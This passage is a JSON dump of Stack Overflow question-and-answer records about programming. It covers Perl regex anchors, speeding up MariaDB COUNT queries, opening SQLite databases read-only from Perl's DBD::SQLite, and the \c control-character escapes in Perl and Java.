"last_edit_date": 1454622222, "question_id": 35212183, "link": "https://stackoverflow.com/questions/35212183/regular-expression-passes-for-one-character-sequence-whereas-fails-for-another", "title": "Regular Expression passes for one character sequence whereas fails for another", "body": "<p>I am using the following regular expression:</p>\n\n<pre><code>$test=\"a\\n\";\n\nif ($test =~ /^.$/ ){\n print \"Test Passed\\n\";\n}else{\n print \"Test Failed\\n\";\n}   \n</code></pre>\n\n<p>For the aforementioned test variable, the regular expression finds the pattern.</p>\n\n<p>However, if I change the variable to the following value it fails to identify the pattern.</p>\n\n<pre><code>$test=\"\\na\";\n</code></pre>\n\n<p>I know that my expression matches a single character i.e. the target should start and end with a single character.</p>\n"}, {"tags": ["mysql", "sql-server", "perl", "mariadb"], "comments": [{"owner": {"reputation": 124613, "user_id": 3522312, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0c5b53060bf7f71994265a9ef7c17cc5?s=128&d=identicon&r=PG", "display_name": "scaisEdge", "link": "https://stackoverflow.com/users/3522312/scaisedge"}, "edited": false, "score": 0, "creation_date": 1454613093, "post_id": 35209484, "comment_id": 58134396, "body": "Have and index on paid ?"}, {"owner": {"reputation": 339644, "user_id": 118068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/077db5466d3b58e7bbbd498dca173f04?s=128&d=identicon&r=PG", "display_name": "Marc B", "link": "https://stackoverflow.com/users/118068/marc-b"}, "edited": false, "score": 3, "creation_date": 1454613127, "post_id": 35209484, "comment_id": 58134419, "body": "general rule of thumb: any field used in a decision context, e.g. join, where, order by, should have an index on it. changing the exact thing you&#39;re counting is mostly irrelevant - you&#39;re counting a subset of the total records, meaning the db has to scan for your <code>where</code> clause matches."}, {"owner": {"reputation": 573, "user_id": 656780, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/9a44da833e35ca617e406fe3989dfa37?s=128&d=identicon&r=PG", "display_name": "Timothy R. Butler", "link": "https://stackoverflow.com/users/656780/timothy-r-butler"}, "edited": false, "score": 0, "creation_date": 1454632043, "post_id": 35209484, "comment_id": 58143899, "body": "Thank you both. I had the index on the wrong field, it seems. This made a huge difference!"}], "answers": [{"comments": [{"owner": {"reputation": 573, "user_id": 656780, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/9a44da833e35ca617e406fe3989dfa37?s=128&d=identicon&r=PG", "display_name": "Timothy R. Butler", "link": "https://stackoverflow.com/users/656780/timothy-r-butler"}, "edited": false, "score": 0, "creation_date": 1454631995, "post_id": 35209923, "comment_id": 58143890, "body": "Wow, thanks -- that&#39;s a fantastic plan. I really appreciate the suggestions. I didn&#39;t have an index on paid, just on id, which now that I think about it wasn&#39;t nearly as helpful. The idea you suggest regarding dealing with the rows long term makes perfect sense; I&#39;m going to implement that tonight. Thanks again!"}, {"owner": {"reputation": 105046, "user_id": 1766831, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ee974306d2def46eb69534fbcf95cc5?s=128&d=identicon&r=PG", "display_name": "Rick James", "link": "https://stackoverflow.com/users/1766831/rick-james"}, "edited": false, "score": 0, "creation_date": 1454723256, "post_id": 35209923, "comment_id": 58187320, "body": "Better yet, don&#39;t add that <code>summarized</code> column.  Instead, keep track of where you left off in the table.  Quite possibly the <code>id</code> would work.  (Put that in another table, perhaps a trivial one-row, one-column table.)  Otherwise, the <code>UPDATE ... SET summarized=1</code> will become your worst bottleneck."}], "tags": [], "owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "is_accepted": true, "score": 0, "last_activity_date": 1454614263, "creation_date": 1454614263, "answer_id": 35209923, "question_id": 35209484, "link": "https://stackoverflow.com/questions/35209484/optimizing-count-on-mariadb-for-a-statistics-table/35209923#35209923", "title": "Optimizing COUNT() on MariaDB for a Statistics Table", "body": "<p>Add a boolean \"summarized\" column to your statistics table and making it part of a multicolumn index with <code>paid</code>.</p>\n\n<p>Then have a background process that produces/updates rows containing the read count in a summary table (by article) and marks the statistics table rows as summarized.  (Though the summary table could just be your article table.)</p>\n\n<p>Then your live query reports the sum of the already summarized results and the as-yet-unsummarized statistics rows.</p>\n\n<p>This also allows you to expire old statistics table rows without losing your read counts.</p>\n\n<p>(All this assumes you already have an index on <code>paid</code>; if you don't, definitely add one and that will likely solve your problem for now, though in the long run likely you still want to be able to delete old statistics records.)</p>\n"}], "owner": {"reputation": 573, "user_id": 656780, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/9a44da833e35ca617e406fe3989dfa37?s=128&d=identicon&r=PG", "display_name": "Timothy R. Butler", "link": "https://stackoverflow.com/users/656780/timothy-r-butler"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 729, "favorite_count": 0, "accepted_answer_id": 35209923, "answer_count": 1, "score": 0, "last_activity_date": 1454614263, "creation_date": 1454612777, "question_id": 35209484, "link": "https://stackoverflow.com/questions/35209484/optimizing-count-on-mariadb-for-a-statistics-table", "title": "Optimizing COUNT() on MariaDB for a Statistics Table", "body": "<p>I've read a number of posts here and elsewhere about people wrestling to improve the performance of the MySQL/MariaDB <code>COUNT</code>function, but I haven't found a solution that quite fits what I am trying to do. I'm trying to produce a live updating list of read counts for a list of articles. Each time a visitor visits a page, a log table in the SQL database records the usual access log-type data (IP, browser, etc.). Of particular interest, I record the user's ID (uid) and I process the user agent tag to classify known spiders (uaType). The article itself is identified by the \"paid\" column. The goal is to produce a statistic that doesn't count the poster's own views of the page and doesn't include known spiders, either. </p>\n\n<p>Here's the query I have:</p>\n\n<pre><code>\"COUNT(*) FROM uninet_log WHERE paid='1942' AND uid != '1' AND uaType != 'Spider'\"\n</code></pre>\n\n<p>This works nicely enough, but very slowly (approximately 1 sec.) when querying against a database with 4.2 million log entries. If I run the query several times during a particular run, it increases the runtime by about another second for each query. I know I could group by <code>paid</code> and then run a single query, but even then (which would require some reworking of my code, but could be done) I feel like 1 second for the query is still really slow and I'm worried about the implications when the server is under a load.</p>\n\n<p>I've tried switching out <code>COUNT(*)</code> for <code>COUNT(1)</code> or <code>COUNT(id)</code> but that doesn't seem to make a difference.</p>\n\n<p>Does anyone have a suggestion on how I might create a better, faster query that would accomplish this same goal? I've thought about having a background process regularly calculate the statistics and cache them, but I'd love to stick to live updating information if possible.</p>\n\n<p>Thanks,\nTim</p>\n"}, {"tags": ["perl", "sqlite", "file-permissions", "readonly"], "comments": [{"owner": {"reputation": 26648, "user_id": 696808, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d2b622a0660b4f8e7cbde1538bb632fc?s=128&d=identicon&r=PG", "display_name": "Bacon Bits", "link": "https://stackoverflow.com/users/696808/bacon-bits"}, "edited": false, "score": 0, "creation_date": 1454610815, "post_id": 35208727, "comment_id": 58133009, "body": "It looks to me like <a href=\"http://search.cpan.org/~ishigaki/DBD-SQLite-1.48/lib/DBD/SQLite.pm\" rel=\"nofollow noreferrer\">some versions</a> of DBD::SQLite allow you to specify <a href=\"http://www.sqlite.org/uri.html\" rel=\"nofollow noreferrer\">standard SQLite URI parameters</a>.  One of those is <code>mode=ro</code>."}, {"owner": {"reputation": 157205, "user_id": 11654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/586424ca0847070dc1868aa58077003e?s=128&d=identicon&r=PG", "display_name": "CL.", "link": "https://stackoverflow.com/users/11654/cl"}, "edited": false, "score": 0, "creation_date": 1454613978, "post_id": 35208727, "comment_id": 58134905, "body": "Are you using WAL mode?"}, {"owner": {"reputation": 384, "user_id": 1961494, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/e05afd7506c9ed77e2b4bcc8b90547b8?s=128&d=identicon&r=PG&f=1", "display_name": "ajlittoz", "link": "https://stackoverflow.com/users/1961494/ajlittoz"}, "reply_to_user": {"reputation": 157205, "user_id": 11654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/586424ca0847070dc1868aa58077003e?s=128&d=identicon&r=PG", "display_name": "CL.", "link": "https://stackoverflow.com/users/11654/cl"}, "edited": false, "score": 0, "creation_date": 1454614293, "post_id": 35208727, "comment_id": 58135121, "body": "@CL DB is opened with default modes; WAL mode is enabled only if it is default"}, {"owner": {"reputation": 7570, "user_id": 17945, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/e8cbc0b9ed29b027a127d8df309af5a6?s=128&d=identicon&r=PG", "display_name": "reinierpost", "link": "https://stackoverflow.com/users/17945/reinierpost"}, "edited": false, "score": 0, "creation_date": 1454616025, "post_id": 35208727, "comment_id": 58136122, "body": "I can make my SQLite database read-only and still access it and execute SELECT statements with DBD::SQLite, so this appears to be platform- or version-specific."}, {"owner": {"reputation": 384, "user_id": 1961494, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/e05afd7506c9ed77e2b4bcc8b90547b8?s=128&d=identicon&r=PG&f=1", "display_name": "ajlittoz", "link": "https://stackoverflow.com/users/1961494/ajlittoz"}, "reply_to_user": {"reputation": 26648, "user_id": 696808, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d2b622a0660b4f8e7cbde1538bb632fc?s=128&d=identicon&r=PG", "display_name": "Bacon Bits", "link": "https://stackoverflow.com/users/696808/bacon-bits"}, "edited": false, "score": 0, "creation_date": 1454616440, "post_id": 35208727, "comment_id": 58136364, "body": "@Bacon Bits: I converted to URI parameters but it does not work"}, {"owner": {"reputation": 384, "user_id": 1961494, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/e05afd7506c9ed77e2b4bcc8b90547b8?s=128&d=identicon&r=PG&f=1", "display_name": "ajlittoz", "link": "https://stackoverflow.com/users/1961494/ajlittoz"}, "reply_to_user": {"reputation": 7570, "user_id": 17945, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/e8cbc0b9ed29b027a127d8df309af5a6?s=128&d=identicon&r=PG", "display_name": "reinierpost", "link": "https://stackoverflow.com/users/17945/reinierpost"}, "edited": false, "score": 0, "creation_date": 1454616519, "post_id": 35208727, "comment_id": 58136423, "body": "@reinierpost How&#39;s your DB readonly? File permissions with or w/o mode parameter?"}], "answers": [{"comments": [{"owner": {"reputation": 7570, "user_id": 17945, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/e8cbc0b9ed29b027a127d8df309af5a6?s=128&d=identicon&r=PG", "display_name": "reinierpost", "link": "https://stackoverflow.com/users/17945/reinierpost"}, "edited": false, "score": 0, "creation_date": 1454614265, "post_id": 35208889, "comment_id": 58135105, "body": "This does not answer the question."}, {"owner": {"reputation": 146934, "user_id": 166339, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8d1152398d84f15b76eb25f13e825cda?s=128&d=identicon&r=PG", "display_name": "Asaph", "link": "https://stackoverflow.com/users/166339/asaph"}, "reply_to_user": {"reputation": 7570, "user_id": 17945, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/e8cbc0b9ed29b027a127d8df309af5a6?s=128&d=identicon&r=PG", "display_name": "reinierpost", "link": "https://stackoverflow.com/users/17945/reinierpost"}, "edited": false, "score": 0, "creation_date": 1454614670, "post_id": 35208889, "comment_id": 58135322, "body": "I believe it does. The idea is that the file can be made readonly if you connect to it this way."}, {"owner": {"reputation": 7570, "user_id": 17945, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/e8cbc0b9ed29b027a127d8df309af5a6?s=128&d=identicon&r=PG", "display_name": "reinierpost", "link": "https://stackoverflow.com/users/17945/reinierpost"}, "edited": false, "score": 0, "creation_date": 1454615941, "post_id": 35208889, "comment_id": 58136076, "body": "It does if that is true."}, {"owner": {"reputation": 384, "user_id": 1961494, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/e05afd7506c9ed77e2b4bcc8b90547b8?s=128&d=identicon&r=PG&f=1", "display_name": "ajlittoz", "link": "https://stackoverflow.com/users/1961494/ajlittoz"}, "edited": false, "score": 0, "creation_date": 1454616612, "post_id": 35208889, "comment_id": 58136474, "body": "@Asaph: No success with sqlite_open_flags as with URI parameter"}], "tags": [], "owner": {"reputation": 146934, "user_id": 166339, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8d1152398d84f15b76eb25f13e825cda?s=128&d=identicon&r=PG", "display_name": "Asaph", "link": "https://stackoverflow.com/users/166339/asaph"}, "is_accepted": false, "score": 2, "last_activity_date": 1454610797, "creation_date": 1454610797, "answer_id": 35208889, "question_id": 35208727, "link": "https://stackoverflow.com/questions/35208727/can-sqlite-db-files-be-made-read-only/35208889#35208889", "title": "Can SQLite DB files be made read-only?", "body": "<p>You must connect to your SQLite db in <code>readonly</code> mode.</p>\n\n<p>From <a href=\"https://metacpan.org/pod/DBD::SQLite#Database-Name-Is-A-File-Name\" rel=\"nofollow\">the docs</a>:</p>\n\n<blockquote>\n  <p>You can also set sqlite_open_flags (only) when you connect to a database:</p>\n\n<pre><code>use DBD::SQLite;\nmy $dbh = DBI-&gt;connect(\"dbi:SQLite:$dbfile\", undef, undef, {\n  sqlite_open_flags =&gt; DBD::SQLite::OPEN_READONLY,\n});\n</code></pre>\n</blockquote>\n\n<p>-- <a href=\"https://metacpan.org/pod/DBD::SQLite#Database-Name-Is-A-File-Name\" rel=\"nofollow\">https://metacpan.org/pod/DBD::SQLite#Database-Name-Is-A-File-Name</a></p>\n"}, {"comments": [{"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1503414282, "post_id": 35212411, "comment_id": 78600084, "body": "I would consider accepting your own answer appropriate. It probably does not affect your rep, but it labels the answer as &quot;this helped me&quot;, which I think is a useful info for future readers."}], "tags": [], "owner": {"reputation": 384, "user_id": 1961494, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/e05afd7506c9ed77e2b4bcc8b90547b8?s=128&d=identicon&r=PG&f=1", "display_name": "ajlittoz", "link": "https://stackoverflow.com/users/1961494/ajlittoz"}, "is_accepted": true, "score": 1, "last_activity_date": 1454622983, "last_edit_date": 1495535396, "creation_date": 1454622983, "answer_id": 35212411, "question_id": 35208727, "link": "https://stackoverflow.com/questions/35208727/can-sqlite-db-files-be-made-read-only/35212411#35212411", "title": "Can SQLite DB files be made read-only?", "body": "<p>The solution is given in the answer to this question <a href=\"https://stackoverflow.com/questions/17793672/perl-dbi-treats-setting-sqlite-db-cache-size-as-a-write-operation-when-subclassi\">Perl DBI treats setting SQLite DB cache_size as a write operation when subclassing DBI</a>.</p>\n\n<p>It turns out that <code>AutoCommit</code> cannot be set to 0 with read-only SQLite DB. Explicitly forcing it to 1 in the read-only DB case solved the problem.</p>\n\n<p>Thanks to all who gave clues and leads.</p>\n"}], "owner": {"reputation": 384, "user_id": 1961494, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/e05afd7506c9ed77e2b4bcc8b90547b8?s=128&d=identicon&r=PG&f=1", "display_name": "ajlittoz", "link": "https://stackoverflow.com/users/1961494/ajlittoz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2034, "favorite_count": 1, "accepted_answer_id": 35212411, "answer_count": 2, "score": 7, "last_activity_date": 1454622983, "creation_date": 1454610273, "last_edit_date": 1454614328, "question_id": 35208727, "link": "https://stackoverflow.com/questions/35208727/can-sqlite-db-files-be-made-read-only", "title": "Can SQLite DB files be made read-only?", "body": "<p>Information from an SQLite DB is presented to user through a web server (displayed in an HTML browser). The DB is loaded once for all by a small application independent from the web server. DB data cannot be changed from user browser (this is a read-only service).</p>\n\n<p>As the web-server has its own user-id, it accesses the SQLite DB file with \"other\" permissions. For security reason, I would like to set the DB file permissions as <code>rw-rw-r--</code>.</p>\n\n<p>Unfortunately, with this permission set, I get a warning <code>attempt to write a readonly database at line xxx</code> which points to a line about a <code>SELECT</code> transaction (which in principle is read-only). Of course, I get no result.</p>\n\n<p>If permissions are changed to <code>rw-rw-rw</code>, everything works fine, but that means everybody can tamper with the DB.</p>\n\n<p><strong>Is there any reason why SQLite DB cannot be accessed read-only?</strong></p>\n\n<p><strong>Are there \"behind-the-scene\" processings which need write access, even for SELECT transactions?</strong></p>\n\n<p><em>Look-up on StackOverflow shows that people usually complain for the opposite situation: encountering a read-only access permission preventing writing to the DB. My goal is to protect my DB against ANY change attempt.</em></p>\n\n<p>For the complete story, my web app is written in <code>Perl</code> and uses <code>DBD::SQLite</code></p>\n"}, {"tags": ["java", "regex", "perl", "control-characters"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 2, "creation_date": 1454616039, "post_id": 35208570, "comment_id": 58136130, "body": "You forgot <code>\\c?</code>. <code>^?</code> refers to the <code>DEL</code> control character (<code>0x7F</code>)."}, {"owner": {"user_type": "does_not_exist", "display_name": "user1089451"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1455502129, "post_id": 35208570, "comment_id": 58503076, "body": "@ikegami Yes you are right. I keep forgetting 0x7F as it always stays in the corner alone."}], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 6, "last_activity_date": 1515599540, "last_edit_date": 1515599540, "creation_date": 1454614489, "answer_id": 35209995, "question_id": 35208570, "link": "https://stackoverflow.com/questions/35208570/java-regular-expression-cx-control-characters/35209995#35209995", "title": "Java regular expression \\cx (control characters)", "body": "<p>All versions of Perl behave the same for the following escapes:</p>\n\n<ul>\n<li><p>When <code>\\c</code> is followed by an ASCII uppercase letter or one of <code>@[\\]^_?</code>,</p>\n\n<p><code>chr(ord($char) ^ 0x40)</code></p>\n\n<p>This provides full coverage of all ASCII control characters (<code>0x00</code>..<code>0x1F</code>, <code>0x7F</code>).</p>\n\n<pre><code>\\c@ === \\x00\n\\cA === \\x01\n...\n\\cZ === \\x1A\n\\c[ === \\x1B\n\\c\\ === \\x1C   # Sometimes \\c\\\\ is needed.\n\\c] === \\x1D\n\\c^ === \\x1E\n\\c_ === \\x1F\n\\c? === \\x7F\n</code></pre></li>\n<li><p>When <code>\\c</code> is followed by an ASCII lowercase letter,</p>\n\n<p><code>chr(ord($char) ^ 0x60)</code></p>\n\n<p>This makes the escape case-insensitive.</p>\n\n<pre><code>\\ca === \\cA === \\x01\n...\n\\cz === \\cZ === \\x1A\n</code></pre></li>\n</ul>\n\n<hr>\n\n<p>No other sequence make sense, but error checking was only introduced in Perl 5.20.</p>\n\n<ul>\n<li><p>&ge;5.20,</p>\n\n<ul>\n<li><p>When <code>\\c</code> is followed by a space, an ASCII digit or one of <code>!\"#$%&amp;'()*+,-./:;&lt;=>{|}~</code>,</p>\n\n<p><code>chr(ord($char) ^ 0x40)</code>, but warns (<code>is more clearly written simply as</code>).</p></li>\n<li><p>When <code>\\c</code> is followed by an ASCII control character (<code>0x00</code>..<code>0x1F</code>, <code>0x7F</code>) or a non-ASCII character (&ge;<code>0x80</code>),</p>\n\n<p>Fatal error <code>Character following \"\\c\" must be printable ASCII</code>.</p></li>\n</ul></li>\n<li><p>&lt;5.20,</p>\n\n<ul>\n<li><p>When <code>\\c</code> is followed by a space, an ASCII digit, one of one of <code>!\"#$%&amp;'()*+,-./:;&lt;=>{|}~</code> or an ASCII control character (<code>0x00</code>..<code>0x1F</code>, <code>0x7F</code>),</p>\n\n<p><code>chr(ord($char) ^ 0x40)</code></p></li>\n<li><p>When <code>\\c</code> is followed by character &ge;<code>0x100</code>,</p>\n\n<p>Total garbage (<code>chr(ord(substr(encode_utf8($char, 0, 1)) ^ 0x40) . encode_utf8($char, 1)</code>).</p></li>\n<li><p>When <code>\\c</code> is followed by character <code>0x80</code>..<code>0xFF</code>,</p>\n\n<p>Depending on the internal storage format of the string, produces either <code>chr(ord($char) ^ 0x40)</code> or the same total garbage as for characters &ge;<code>0x100</code>.</p></li>\n</ul></li>\n</ul>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user1089451"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1220, "favorite_count": 2, "accepted_answer_id": 35209995, "answer_count": 1, "score": 5, "last_activity_date": 1515599540, "creation_date": 1454609782, "last_edit_date": 1495541867, "question_id": 35208570, "link": "https://stackoverflow.com/questions/35208570/java-regular-expression-cx-control-characters", "title": "Java regular expression \\cx (control characters)", "body": "<p>Javadoc for <code>java.util.regex.Pattern</code> says <code>\\cx</code> represents <em>The control character corresponding to x</em>. So I thought <code>Pattern.compile()</code> would reject a <code>\\c</code> followed by any character other than <code>[@-_]</code>, but it doesn't!</p>\n\n<p>As @tchrist commented on one of the answers to <a href=\"https://stackoverflow.com/questions/4893759/what-is-a-regular-expression-for-control-characters\">What is a regular expression for control characters?</a>, range is not checked at all. I tested a couple characters from higher blocks and also astral planes, looks like it merely flips the 7th lowest bit of the codepoint value.</p>\n\n<p>So is it a Javadoc bug or an implementation bug or am I misunderstanding something? Is <code>\\cx</code> a Java-invented syntax or is it supported by other regex engines, especially Perl? How is it handled there?</p>\n"}]